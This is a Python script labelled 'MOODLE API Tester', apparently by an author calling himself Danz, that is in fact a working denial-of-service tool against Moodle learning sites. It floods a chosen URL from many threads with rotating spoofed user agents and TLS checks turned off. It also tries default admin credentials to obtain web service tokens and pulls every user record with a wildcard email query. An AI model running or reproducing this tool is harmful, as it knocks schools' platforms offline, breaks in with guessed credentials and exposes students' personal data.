import time
import json
import random
import requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class MoodleAPITester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest"
        }
        # Common Moodle endpoints
        self.endpoints = [
            "login/index.php",
            "login/token.php",
            "webservice/rest/server.php",
            "course/view.php",
            "user/profile.php",
            "mod/forum/view.php",
            "mod/quiz/view.php",
            "mod/assign/view.php",
            "calendar/view.php",
            "grade/report/user/index.php",
            "admin/settings.php",
            "admin/tool/uploaduser/index.php",
            "admin/tool/dataprivacy/summary.php",
            "blocks/online_users/",
            "lib/ajax/service.php",
            "auth/oauth2/"
        ]
        self.payloads = {
            "token_request": {
                "username": "admin",
                "password": "admin123",
                "service": "moodle_mobile_app"
            },
            "course_request": {
                "wstoken": "",
                "wsfunction": "core_course_get_contents",
                "courseid": "1",
                "moodlewsrestformat": "json"
            },
            "user_request": {
                "wstoken": "",
                "wsfunction": "core_user_get_users",
                "criteria[0][key]": "email",
                "criteria[0][value]": "%",
                "moodlewsrestformat": "json"
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def get_token(self, url, username="admin", password="admin123"):
        token_url = f"{url.rstrip('/')}/login/token.php"
        data = {
            "username": username,
            "password": password,
            "service": "moodle_mobile_app"
        }
        try:
            response = requests.post(
                token_url,
                data=data,
                headers=self.headers,
                verify=False,
                timeout=5
            )
            if response.ok:
                return response.json().get("token")
        except:
            pass
        return None

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()

        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
            else:
                response = requests.post(
                    full_url,
                    json=data,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting DoS attack on {url} for {duration}s with {workers} threads")
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = None
                
                if method == "POST":
                    payload_type = random.choice(list(self.payloads.keys()))
                    payload = self.payloads[payload_type]
                    if "wstoken" in payload:
                        token = self.get_token(url)
                        if token:
                            payload["wstoken"] = token
                
                self.send_request(method, url, endpoint, data=payload)
                time.sleep(random.uniform(0.1, 0.3))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    print("""
    ╔════════════════════════════════════════╗
    ║          MOODLE API Tester             ║
    ║            coded by Danz               ║
    ╚════════════════════════════════════════╝
    """)
    
    target_url = input("Masukan target Moodle URL (e.g., https://moodle.example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        workers = int(input("Masukan number of threads (default: 20): ") or 20)
        duration = int(input("Masukan duration in seconds (default: 120): ") or 120)
        
        tester = MoodleAPITester()
        tester.flood(target_url, workers=workers, duration=duration)
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user.")
    except ValueError:
        print("[ERROR] Please enter valid numbers for threads and duration.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
